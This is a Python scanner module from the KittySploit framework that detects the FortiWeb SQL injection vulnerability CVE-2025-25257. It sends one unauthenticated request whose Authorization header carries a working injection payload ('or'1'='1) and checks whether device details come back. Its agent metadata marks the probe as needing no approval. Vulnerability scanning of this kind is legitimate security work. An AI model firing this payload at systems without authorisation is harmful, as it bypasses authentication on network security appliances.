#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability [CWE-89]."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortinet FortiWeb - SQL Injection Detection',
        'description': "An improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability [CWE-89] in FortiWeb may allow an unauthenticated attacker to execute unauthorized SQL code or commands via crafted HTTP or HTTPS requests.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'fortinet', 'fortiweb', 'sqli', 'unauth', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/',
            'https://fortiguard.fortinet.com/psirt/FG-IR-25-151',
        ],
        'cve': 'CVE-2025-25257',
    }

    def run(self):
        path = '/api/fabric/device/status'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Authorization': "Bearer AAAAAA'or'1'='1"})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('serial', 'fortiweb', 'device_type',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Fortinet FortiWeb - SQL Injection detected', path=path)
            return True
        return False

